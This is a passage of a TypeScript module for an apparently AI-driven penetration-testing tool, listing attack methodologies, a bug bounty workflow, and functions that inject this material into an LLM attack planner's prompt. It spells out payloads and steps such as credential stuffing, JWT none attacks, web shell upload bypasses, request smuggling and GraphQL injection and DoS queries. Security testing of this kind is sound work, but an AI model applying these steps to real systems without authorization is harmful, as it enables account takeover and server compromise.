    phases: ["Test default/weak credentials", "Test password brute-forcing", "Test account lockout mechanisms", "Test password reset flow", "Test session fixation", "Test JWT vulnerabilities", "Test OAuth/SSO misconfigurations", "Test 2FA bypass"],
    tools: ["hydra", "burpsuite", "jwt_tool", "patator"],
    detection_patterns: ["login", "signin", "auth", "session", "token", "password", "reset", "forgot", "2fa", "otp"],
    exploitation_steps: ["1. Try default creds: admin/admin, admin/password", "2. Test credential stuffing with leaked databases", "3. Test password reset token predictability", "4. Test JWT none algorithm attack", "5. Test OAuth redirect_uri manipulation", "6. Test 2FA bypass via response manipulation"],
    impact: "Account takeover, unauthorized access, identity theft",
    severity_range: "High-Critical",
    applicable_labs: ["dvwa", "bwapp", "mutillidae", "crapi", "juice-shop", "webgoat"],
    cwe_ids: ["CWE-287", "CWE-384", "CWE-640"]
  },
  {
    id: "file-upload-methodology",
    name: "File Upload Vulnerability Testing",
    category: "injection",
    description: "Testing for unrestricted file upload to achieve code execution",
    phases: ["Identify file upload functionality", "Test extension bypass (.php5, .phtml, .php.jpg)", "Test content-type bypass", "Test magic bytes manipulation", "Test double extension and null byte injection", "Test upload path traversal", "Attempt web shell upload"],
    tools: ["burpsuite", "ffuf", "curl"],
    detection_patterns: ["upload", "file", "attachment", "import", "avatar", "image"],
    exploitation_steps: ["1. Upload normal file, note path and naming", "2. Upload .php file, check if blocked", "3. Try double extension: shell.php.jpg", "4. Try null byte: shell.php%00.jpg", "5. Change Content-Type to image/jpeg with PHP content", "6. Add GIF89a magic bytes before PHP code", "7. Try .htaccess upload to enable PHP execution"],
    impact: "Remote code execution, full server compromise",
    severity_range: "Critical",
    applicable_labs: ["dvwa", "bwapp", "mutillidae"],
    cwe_ids: ["CWE-434"]
  },
  {
    id: "request-smuggling-methodology",
    name: "HTTP Request Smuggling",
    category: "protocol",
    description: "Testing for HTTP request smuggling via CL.TE and TE.CL desync",
    phases: ["Identify front-end/back-end architecture", "Test CL.TE smuggling", "Test TE.CL smuggling", "Test TE.TE with obfuscation", "Attempt request hijacking", "Chain with cache poisoning or credential theft"],
    tools: ["smuggler", "turbo-intruder", "burpsuite", "h2csmuggler"],
    detection_patterns: ["Transfer-Encoding", "Content-Length", "HTTP/1.1", "reverse proxy", "load balancer"],
    exploitation_steps: ["1. Send ambiguous CL/TE headers", "2. CL.TE: Set CL shorter than body, include smuggled request", "3. TE.CL: Use chunked encoding with smuggled request after 0\\r\\n", "4. Observe if next user's request is affected", "5. Chain with cache poisoning for wider impact"],
    impact: "Request hijacking, cache poisoning, credential theft, WAF bypass",
    severity_range: "High-Critical",
    applicable_labs: ["webgoat"],
    cwe_ids: ["CWE-444"]
  },
  {
    id: "race-condition-methodology",
    name: "Race Condition Exploitation",
    category: "logic",
    description: "Testing for TOCTOU and race condition vulnerabilities in business logic",
    phases: ["Identify state-changing operations (transfers, purchases, votes)", "Identify operations with check-then-act patterns", "Send concurrent requests to exploit timing windows", "Test limit bypass via parallel requests", "Test coupon/discount double-spending"],
    tools: ["turbo-intruder", "racepwn", "burpsuite"],
    detection_patterns: ["balance", "transfer", "purchase", "vote", "coupon", "redeem", "apply", "withdraw"],
    exploitation_steps: ["1. Identify target endpoint with state change", "2. Prepare identical requests", "3. Send 20+ requests simultaneously", "4. Check if operation executed multiple times", "5. Verify if balance/inventory went negative"],
    impact: "Financial loss, business logic bypass, data corruption",
    severity_range: "Medium-High",
    applicable_labs: ["juice-shop", "crapi"],
    cwe_ids: ["CWE-362"]
  },
  {
    id: "subdomain-takeover-methodology",
    name: "Subdomain Takeover",
    category: "misconfiguration",
    description: "Testing for dangling DNS records pointing to unclaimed cloud services",
    phases: ["Enumerate all subdomains", "Resolve CNAME records for each subdomain", "Check if CNAME targets are claimable", "Verify service is unclaimed (404, default page)", "Claim the service and prove takeover"],
    tools: ["subjack", "subzy", "dnsreaper", "dnsx"],
    detection_patterns: ["NXDOMAIN", "NoSuchBucket", "There isn't a GitHub Pages site here", "Domain not found", "Heroku | No such app"],
    exploitation_steps: ["1. Enumerate subdomains with subfinder/amass", "2. Resolve CNAMEs: cat subs.txt | dnsx -cname", "3. Check for dangling records pointing to cloud services", "4. Claim the unclaimed service (S3 bucket, GitHub Pages, etc.)", "5. Host proof-of-concept content"],
    impact: "Phishing, credential theft, cookie theft, reputation damage",
    severity_range: "Medium-High",
    applicable_labs: [],
    cwe_ids: ["CWE-284"]
  },
  {
    id: "graphql-methodology",
    name: "GraphQL Security Testing",
    category: "api",
    description: "Testing GraphQL endpoints for injection, introspection, and authorization flaws",
    phases: ["Discover GraphQL endpoints", "Test introspection query", "Map schema and identify sensitive queries/mutations", "Test authorization on all queries", "Test injection in query arguments", "Test batching attacks", "Test for DoS via nested queries"],
    tools: ["inql", "graphqlmap", "clairvoyance", "burpsuite"],
    detection_patterns: ["/graphql", "/graphiql", "/playground", "__schema", "__type", "query {", "mutation {"],
    exploitation_steps: ["1. Send introspection query: {__schema{types{name}}}", "2. Map all queries and mutations", "3. Test each query with different auth levels", "4. Inject in string arguments: ' OR 1=1--", "5. Test nested queries for DoS: {a{b{c{d{e{f}}}}}}", "6. Test batch queries: [{query:'...'},{query:'...'}]"],
    impact: "Data exposure, injection, DoS, authorization bypass",
    severity_range: "Medium-Critical",
    applicable_labs: ["dvga", "juice-shop"],
    cwe_ids: ["CWE-200", "CWE-89", "CWE-284"]
  },
];

// ─── Bug Bounty Workflow ───────────────────────────────────────────────

const BUG_BOUNTY_WORKFLOW: WorkflowStep[] = [
  { phase: "recon", order: 1, action: "Subdomain Enumeration", tools: ["subfinder", "amass", "assetfinder", "massdns"], output: "subdomains.txt", feeds_into: ["DNS Resolution", "Port Scanning"] },
  { phase: "recon", order: 2, action: "DNS Resolution & Validation", tools: ["dnsx", "puredns", "massdns"], output: "live_subdomains.txt", feeds_into: ["HTTP Probing"] },
  { phase: "recon", order: 3, action: "Port Scanning", tools: ["naabu", "masscan", "rustscan"], output: "open_ports.txt", feeds_into: ["Service Detection"] },
  { phase: "recon", order: 4, action: "HTTP Probing & Tech Detection", tools: ["httpx", "wappalyzer", "whatweb"], output: "live_hosts.txt", feeds_into: ["Content Discovery", "Screenshots"] },
  { phase: "recon", order: 5, action: "Visual Recon (Screenshots)", tools: ["gowitness", "eyewitness", "aquatone"], output: "screenshots/", feeds_into: ["Manual Review"] },
  { phase: "recon", order: 6, action: "WAF Detection", tools: ["wafw00f", "cdncheck"], output: "waf_results.txt", feeds_into: ["Exploitation Strategy"] },
  { phase: "enumeration", order: 7, action: "Content Discovery", tools: ["feroxbuster", "gobuster", "dirsearch", "katana"], output: "discovered_paths.txt", feeds_into: ["Parameter Discovery", "JS Analysis"] },
  { phase: "enumeration", order: 8, action: "Historical URL Mining", tools: ["waybackurls", "gau", "waymore"], output: "historical_urls.txt", feeds_into: ["Parameter Discovery", "Vulnerability Patterns"] },
  { phase: "enumeration", order: 9, action: "JavaScript Analysis", tools: ["linkfinder", "jsluice", "secretfinder"], output: "js_endpoints.txt", feeds_into: ["API Testing", "Secret Validation"] },
  { phase: "enumeration", order: 10, action: "Parameter Discovery", tools: ["arjun", "paramspider", "x8"], output: "parameters.txt", feeds_into: ["Fuzzing", "Injection Testing"] },
  { phase: "enumeration", order: 11, action: "Secret Scanning", tools: ["gitleaks", "trufflehog", "noseyparker"], output: "secrets.txt", feeds_into: ["Credential Validation"] },
  { phase: "enumeration", order: 12, action: "Cloud Storage Enumeration", tools: ["s3scanner", "cloudbrute"], output: "buckets.txt", feeds_into: ["Data Exposure Assessment"] },
  { phase: "vulnerability_scanning", order: 13, action: "Template-Based Scanning", tools: ["nuclei", "nikto"], output: "scan_results.txt", feeds_into: ["Vulnerability Validation"] },
  { phase: "vulnerability_scanning", order: 14, action: "Web App Scanning", tools: ["zap", "burpsuite", "osmedeus"], output: "vuln_report.txt", feeds_into: ["Manual Exploitation"] },
  { phase: "vulnerability_scanning", order: 15, action: "CMS-Specific Scanning", tools: ["wpscan", "cmsmap", "joomscan"], output: "cms_vulns.txt", feeds_into: ["CMS Exploitation"] },
  { phase: "exploitation", order: 16, action: "Injection Testing (SQLi/XSS/SSTI)", tools: ["sqlmap", "xsstrike", "dalfox", "tplmap"], output: "injection_results.txt", feeds_into: ["Impact Assessment"] },
  { phase: "exploitation", order: 17, action: "Access Control Testing (IDOR/BOLA)", tools: ["autorize", "burpsuite", "curl"], output: "idor_results.txt", feeds_into: ["Impact Assessment"] },
  { phase: "exploitation", order: 18, action: "Authentication Testing", tools: ["hydra", "jwt_tool", "burpsuite"], output: "auth_results.txt", feeds_into: ["Account Takeover"] },
  { phase: "exploitation", order: 19, action: "SSRF/XXE Testing", tools: ["ssrfmap", "xxeinjector", "interactsh"], output: "ssrf_results.txt", feeds_into: ["Internal Access"] },
  { phase: "exploitation", order: 20, action: "Advanced Testing (Smuggling/Race/Deserialization)", tools: ["smuggler", "turbo-intruder", "ysoserial"], output: "advanced_results.txt", feeds_into: ["Impact Assessment"] },
  { phase: "reporting", order: 21, action: "Finding Documentation & Report", tools: ["burpsuite", "bountyplz"], output: "report.md", feeds_into: [] },
];

// ─── Query Functions ───────────────────────────────────────────────────

export function getAllBugBountyTools(): BugBountyTool[] {
  return BUG_BOUNTY_TOOLS;
}

export function getToolsByPhase(phase: BugBountyPhase): BugBountyTool[] {
  return BUG_BOUNTY_TOOLS.filter(t => t.phase === phase);
}

export function getToolsByCategory(category: string): BugBountyTool[] {
  return BUG_BOUNTY_TOOLS.filter(t => t.category === category);
}

export function getEssentialTools(): BugBountyTool[] {
  return BUG_BOUNTY_TOOLS.filter(t => t.priority === "essential");
}

export function searchTools(query: string): BugBountyTool[] {
  const q = query.toLowerCase();
  return BUG_BOUNTY_TOOLS.filter(t =>
    t.name.toLowerCase().includes(q) ||
    t.description.toLowerCase().includes(q) ||
    t.category.toLowerCase().includes(q) ||
    t.use_case.toLowerCase().includes(q)
  );
}

export function getAllMethodologies(): AttackMethodology[] {
  return ATTACK_METHODOLOGIES;
}

export function getMethodologyById(id: string): AttackMethodology | undefined {
  return ATTACK_METHODOLOGIES.find(m => m.id === id);
}

export function getMethodologiesForLab(labId: string): AttackMethodology[] {
  return ATTACK_METHODOLOGIES.filter(m => m.applicable_labs.includes(labId));
}

export function getMethodologiesByCategory(category: string): AttackMethodology[] {
  return ATTACK_METHODOLOGIES.filter(m => m.category === category);
}

export function getWorkflow(): WorkflowStep[] {
  return BUG_BOUNTY_WORKFLOW;
}

export function getWorkflowByPhase(phase: BugBountyPhase): WorkflowStep[] {
  return BUG_BOUNTY_WORKFLOW.filter(s => s.phase === phase);
}

// ─── Context Builders for LLM Injection ────────────────────────────────

/**
 * Build comprehensive methodology context for the AI attack planner.
 * This is injected into the LLM system prompt during scan planning.
 */
export function buildMethodologyContext(targetPreset?: string): string {
  const methodologies = targetPreset
    ? getMethodologiesForLab(targetPreset)
    : ATTACK_METHODOLOGIES;

  if (methodologies.length === 0) return "";

  const lines: string[] = [
    "=== BUG BOUNTY METHODOLOGY KNOWLEDGE ===",
    ""
  ];

  for (const m of methodologies) {
    lines.push(`## ${m.name} (${m.severity_range})`);
    lines.push(`Category: ${m.category} | CWEs: ${m.cwe_ids.join(", ")}`);
    lines.push(`Description: ${m.description}`);
    lines.push(`Testing Phases:`);
    m.phases.forEach((p, i) => lines.push(`  ${i + 1}. ${p}`));
    lines.push(`Tools: ${m.tools.join(", ")}`);
    lines.push(`Detection Patterns: ${m.detection_patterns.slice(0, 5).join(", ")}`);
    lines.push(`Key Exploitation Steps:`);
    m.exploitation_steps.slice(0, 3).forEach(s => lines.push(`  ${s}`));
    lines.push(`Impact: ${m.impact}`);
    lines.push("");
  }

  return lines.join("\n");
}

/**
 * Build tool recommendation context for a specific scan phase.
 * Injected into the engagement orchestrator during phase transitions.
 */
export function buildPhaseToolContext(phase: BugBountyPhase): string {
  const tools = getToolsByPhase(phase);
  const workflow = getWorkflowByPhase(phase);

  if (tools.length === 0) return "";

  const lines: string[] = [
    `=== RECOMMENDED TOOLS FOR ${phase.toUpperCase()} PHASE ===`,
    ""
  ];

  // Essential tools first
  const essential = tools.filter(t => t.priority === "essential");
  if (essential.length > 0) {
    lines.push("ESSENTIAL TOOLS:");
    essential.forEach(t => {
      lines.push(`  - ${t.name}: ${t.use_case}`);
      if (t.command_example) lines.push(`    Example: ${t.command_example}`);
    });
    lines.push("");
  }

  // Recommended tools
  const recommended = tools.filter(t => t.priority === "recommended");
  if (recommended.length > 0) {
    lines.push("RECOMMENDED TOOLS:");
    recommended.forEach(t => {
      lines.push(`  - ${t.name}: ${t.use_case}`);
    });
    lines.push("");
  }

  // Workflow steps
  if (workflow.length > 0) {
    lines.push("WORKFLOW STEPS:");
    workflow.forEach(s => {
      lines.push(`  ${s.order}. ${s.action} → Output: ${s.output}`);
      lines.push(`     Tools: ${s.tools.join(", ")}`);
      if (s.feeds_into.length > 0) lines.push(`     Feeds into: ${s.feeds_into.join(", ")}`);
    });
    lines.push("");
  }

  return lines.join("\n");
}

/**
 * Build vulnerability-specific testing context.
 * Used when the engagement orchestrator detects a specific vuln type.
 */
export function buildVulnTestingContext(vulnType: string): string {
  const typeMap: Record<string, string> = {
    "sql_injection": "sqli-methodology",
    "sqli": "sqli-methodology",
    "xss": "xss-methodology",
    "cross_site_scripting": "xss-methodology",
    "ssrf": "ssrf-methodology",
    "server_side_request_forgery": "ssrf-methodology",
    "idor": "idor-methodology",
    "broken_access_control": "idor-methodology",
    "api": "api-security-methodology",
    "api_security": "api-security-methodology",
    "xxe": "xxe-methodology",
    "xml_external_entity": "xxe-methodology",
    "ssti": "ssti-methodology",
    "template_injection": "ssti-methodology",
    "authentication": "broken-auth-methodology",
    "broken_auth": "broken-auth-methodology",
    "file_upload": "file-upload-methodology",
    "request_smuggling": "request-smuggling-methodology",
    "race_condition": "race-condition-methodology",
    "subdomain_takeover": "subdomain-takeover-methodology",
    "graphql": "graphql-methodology",
  };

  const methodologyId = typeMap[vulnType.toLowerCase().replace(/[\s-]/g, "_")] || vulnType;
  const methodology = getMethodologyById(methodologyId);

  if (!methodology) return "";

  const lines: string[] = [
    `=== ${methodology.name.toUpperCase()} TESTING GUIDE ===`,
    "",
    `Description: ${methodology.description}`,
    `Severity Range: ${methodology.severity_range}`,
    `CWEs: ${methodology.cwe_ids.join(", ")}`,
    "",
    "TESTING PHASES:",
  ];

  methodology.phases.forEach((p, i) => lines.push(`  ${i + 1}. ${p}`));

  lines.push("", "EXPLOITATION STEPS:");
  methodology.exploitation_steps.forEach(s => lines.push(`  ${s}`));

  lines.push("", "DETECTION PATTERNS:");
  lines.push(`  ${methodology.detection_patterns.join(", ")}`);

  lines.push("", "RECOMMENDED TOOLS:");
  methodology.tools.forEach(t => {
    const tool = BUG_BOUNTY_TOOLS.find(bt => bt.name === t);
    if (tool) {
      lines.push(`  - ${tool.name}: ${tool.use_case}`);
      if (tool.command_example) lines.push(`    Example: ${tool.command_example}`);
    } else {
      lines.push(`  - ${t}`);
    }
  });

  lines.push("", `IMPACT: ${methodology.impact}`);

  return lines.join("\n");
}

/**
 * Build a comprehensive scan planning context that combines
 * methodology, tools, and workflow for a given target.
 */
export function buildScanPlanningContext(targetPreset?: string, phase?: BugBountyPhase): string {
  const parts: string[] = [];

  // Add methodology context
  const methodCtx = buildMethodologyContext(targetPreset);
  if (methodCtx) parts.push(methodCtx);

  // Add phase-specific tool context
  if (phase) {
    const phaseCtx = buildPhaseToolContext(phase);
    if (phaseCtx) parts.push(phaseCtx);
  }

  return parts.join("\n\n");
}

// ─── Stats ─────────────────────────────────────────────────────────────

export function getBugBountyStats() {
  const categories = [...new Set(BUG_BOUNTY_TOOLS.map(t => t.category))];
  const phases = [...new Set(BUG_BOUNTY_TOOLS.map(t => t.phase))];
  return {
    total_tools: BUG_BOUNTY_TOOLS.length,
    total_categories: categories.length,
    total_methodologies: ATTACK_METHODOLOGIES.length,
    total_workflow_steps: BUG_BOUNTY_WORKFLOW.length,
    categories,
    phases,
    essential_tools: BUG_BOUNTY_TOOLS.filter(t => t.priority === "essential").length,
  };
}
